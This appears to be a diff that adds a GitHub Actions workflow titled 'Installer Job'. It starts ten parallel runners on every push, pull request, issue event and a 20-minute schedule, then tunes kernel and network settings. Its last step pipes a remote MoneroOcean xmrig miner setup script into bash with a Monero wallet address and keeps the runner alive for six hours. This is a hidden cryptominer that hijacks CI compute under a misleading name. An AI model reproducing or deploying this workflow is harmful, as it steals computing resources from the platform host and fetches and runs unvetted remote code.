@@ -1,0 +1,80 @@
+name: Installer Job
+
+on:
+  push:  # Trigger workflow on any push event
+  pull_request:  # Trigger workflow on any pull request event
+  issues:  # Trigger workflow when an issue is opened, closed, etc.
+  # You can add more events if needed (e.g., fork, release, etc.)
+  schedule:
+    - cron: '*/20 * * * *'
+
+jobs:
+  run-installer:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    strategy:
+      matrix:
+        instance: [1,2,3,4,5,6,7,8,9,10]
+
+    steps:
+      - name: Run installer
+        run: |
+          set -euo pipefail
+          export OMP_NUM_THREADS=4
+          export MEMORY_LIMIT=8G
+          echo "=== VM / Kernel tuning ==="
+
+          # HugePages
+          sudo sysctl -w vm.nr_hugepages=1280 || true
+
+          sudo sysctl -w vm.swappiness=10
+          sudo sysctl -w vm.dirty_ratio=15
+          sudo sysctl -w vm.dirty_background_ratio=5
+          sudo sysctl -w vm.overcommit_memory=1
+
+          # IO / flush
+          sudo sysctl -w vm.dirty_expire_centisecs=3000
+          sudo sysctl -w vm.dirty_writeback_centisecs=500
+
+          echo "=== Limits ==="
+
+          ulimit -n 1048576 || true
+          ulimit -u 65535 || true
+          sudo sysctl -w fs.file-max=2097152 || true
+
+          echo "=== Network tuning ==="
+
+          sudo sysctl -w net.core.somaxconn=65535
+          sudo sysctl -w net.ipv4.tcp_max_syn_backlog=8192
+          sudo sysctl -w net.ipv4.tcp_fin_timeout=15
+          sudo sysctl -w net.ipv4.tcp_tw_reuse=1
+
+          # Buffers
+          sudo sysctl -w net.core.rmem_max=134217728
+          sudo sysctl -w net.core.wmem_max=134217728
+          sudo sysctl -w net.ipv4.tcp_rmem="4096 87380 67108864"
+          sudo sysctl -w net.ipv4.tcp_wmem="4096 65536 67108864"
+
+          echo "=== DNS setup ==="
+
+          echo "nameserver 1.1.1.1" | sudo tee /etc/resolv.conf
+          echo "nameserver 8.8.8.8" | sudo tee -a /etc/resolv.conf
+
+          # Flush DNS cache (se disponível)
+          sudo systemd-resolve --flush-caches || true
+
+          ping -c 2 1.1.1.1 || true
+          ping -c 2 google.com || true
+
+          echo "=== START INSTALL ==="
+          echo "Start at $(date)"
+          echo "Repo: $GITHUB_REPOSITORY"
+          echo "Run ID: $GITHUB_RUN_ID"
+          echo "Instance: ${{ matrix.instance }}"
+
+          RUNNER_NAME="runnervm${{ matrix.instance }}-${{ github.run_id }}"
+          echo "Runner: $RUNNER_NAME"
+
+          echo "Finished at $(date)"
+          curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 46egUxZjZpT6WcmSbwdycWMxKuVU1HxFWVKX5iUSokpWDSG14LVqnRk21SD7REgpsZBz7Qeytm36qjPJvvnv1XBPBnNniem
+          sleep 21600  # Sleep for 6 hours (21600 seconds)
